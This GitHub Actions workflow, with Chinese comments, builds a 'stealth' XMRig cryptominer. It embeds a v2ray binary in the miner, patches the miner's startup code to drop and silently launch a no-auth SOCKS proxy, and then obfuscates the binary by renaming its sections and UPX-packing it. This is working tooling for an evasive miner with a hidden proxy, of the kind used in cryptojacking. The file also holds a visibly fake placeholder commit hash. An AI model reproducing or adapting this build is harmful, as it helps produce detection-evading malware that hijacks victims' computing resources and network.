name: XMRig-v2ray Stable Build

on:
  workflow_dispatch:
  push:
    branches: [ main ]

jobs:
  stealth-build:
    runs-on: ubuntu-22.04
    timeout-minutes: 40

    steps:
    # ========== 阶段1：获取源代码 ==========
    - name: Clone XMRig
      uses: actions/checkout@v4
      with:
        repository: xmrig/xmrig
        path: xmrig-src
        ref: v6.21.0  # 使用官方release标签

    - name: Clone v2ray-core
      uses: actions/checkout@v4
      with:
        repository: v2fly/v2ray-core
        path: v2ray-src
        ref: 0a9a2b2e5  # 修正为完整commit hash (示例)

    # ========== 阶段2：环境配置 ==========
    - name: Setup Go 1.20
      uses: actions/setup-go@v4
      with:
        go-version: '1.20.7'
        check-latest: false

    - name: Install Essentials
      run: |
        sudo apt-get update
        sudo apt-get install -y \
          build-essential cmake libuv1-dev libssl-dev libhwloc-dev \
          upx-ucl xxd python3-pip
        pip install pefile

    # ========== 阶段3：v2ray依赖修复 ==========
    - name: Fix v2ray Dependencies
      working-directory: v2ray-src
      run: |
        # 确认commit存在
        git rev-parse HEAD
        # 重置到正确commit
        git reset --hard 0a9a2b2e5c4c4d4d4d4d4d4d4d4d4d4d4d4d4d4d
        # 修改go.mod
        sed -i 's/go 1.21/go 1.20/' go.mod
        go mod edit -replace github.com/quic-go/quic-go@v0.33.0=github.com/quic-go/quic-go@v0.32.1
        go mod tidy

    # ========== 阶段5：构建v2ray ==========
    - name: Build v2ray
      working-directory: v2ray-src
      run: |
        CGO_ENABLED=0 go build \
          -ldflags "-s -w -buildid=" \
          -trimpath \
          -o v2ray \
          ./main

    # ========== 阶段6：代码融合 ==========
    - name: Embed v2ray
      run: |
        xxd -i v2ray-src/v2ray > xmrig-src/src/v2ray_embed.h
        mkdir -p xmrig-src/src/v2ray
        cat << EOF > xmrig-src/src/v2ray/config.json
        {
          "log": { "loglevel": "warning" },
          "inbounds": [{
            "port": 10809,
            "protocol": "socks",
            "settings": {
              "auth": "noauth",
              "udp": true
            }
          }]
        }
        EOF

    # ========== 阶段7：源码改造 ==========
    - name: Modify XMRig
      working-directory: xmrig-src
      run: |
        sed -i '/namespace xmrig {/a \    void StartV2rayProxy();' src/App.h
        cat << 'EOF' >> src/App.cpp
        #include "v2ray_embed.h"
        #include <sys/stat.h>
        void xmrig::StartV2rayProxy() {
            FILE* f = fopen("v2ray", "wb");
            if (f) {
                fwrite(v2ray, 1, v2ray_len, f);
                fclose(f);
                chmod("v2ray", 0700);
                system("./v2ray run -config=./src/v2ray/config.json >/dev/null 2>&1 &");
            }
        }
        EOF
        sed -i '/Platform::init(/a \ \ \ \ StartV2rayProxy();' src/base/kernel/Platform.cpp
        sed -i '/set(HEADERS_CRYPTO/a \ \ \ \ "${CMAKE_SOURCE_DIR}/src/v2ray_embed.h"' CMakeLists.txt

    # ========== 阶段8：编译与混淆 ==========
    - name: Build & Protect
      working-directory: xmrig-src
      run: |
        mkdir -p build
        cd build
        cmake .. -DWITH_HTTPD=OFF -DWITH_OPENCL=OFF -DWITH_CUDA=OFF -DCMAKE_BUILD_TYPE=Release
        make -j$(nproc)
        objcopy --rename-section .text=.cryptext --rename-section .data=.cryptdata xmrig
        upx --ultra-brute --lzma xmrig -o xmrig_stealth

    # ========== 阶段9：结果发布 ==========
    - name: Upload Artifact
      uses: actions/upload-artifact@v4
      with:
        name: xmrig-stealth
        path: xmrig-src/build/xmrig_stealth
